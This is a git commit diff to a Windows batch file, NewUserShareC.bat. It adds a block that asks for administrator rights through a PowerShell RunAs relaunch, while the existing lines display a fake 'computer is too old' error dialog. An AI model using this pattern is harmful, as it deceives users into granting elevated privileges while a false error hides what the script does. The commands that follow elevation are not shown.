35afd1882b590e05a8c28e5446d6c0e38fd3a231
oksesaneka22 <49028843+oksesaneka22@users.noreply.github.com>
2024-09-22 16:27:53 +0300

    Update NewUserShareC.bat

--- NewUserShareC.bat
+++ NewUserShareC.bat
@@ -1,4 +1,15 @@
 @echo off
+:: Check for administrative privileges
+NET SESSION >nul 2>&1
+IF %ERRORLEVEL% NEQ 0 (
+    echo Requesting administrative privileges...
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
+:: Your commands go here
+echo Running as Administrator...
+
 echo msgbox "Your computer is to old to run this program", vbCritical, "Error" > temp.vbs
 
 cscript //nologo temp.vbs
